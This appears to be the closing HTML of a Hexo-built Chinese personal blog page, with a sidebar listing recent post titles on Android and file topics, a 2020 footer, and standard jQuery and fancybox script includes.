            <a href="/2020/01/28/Intent%E5%AE%9E%E7%8E%B0%E6%8B%A8%E5%8F%B7/">Intent实现拨号</a>
          </li>
        
          <li>
            <a href="/2020/01/27/PE%E6%96%87%E4%BB%B6%E5%88%A4%E5%AE%9A/">PE文件判定</a>
          </li>
        
          <li>
            <a href="/2020/01/27/Android-Anr%E5%BC%82%E5%B8%B8/">Android Anr异常</a>
          </li>
        
          <li>
            <a href="/2020/01/27/Android%E6%A8%AA%E7%AB%96%E5%B1%8F%E8%AE%BE%E7%BD%AE/">Android横竖屏设置</a>
          </li>
        
          <li>
            <a href="/2020/01/26/File-operate2/">File operate2</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Wker<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>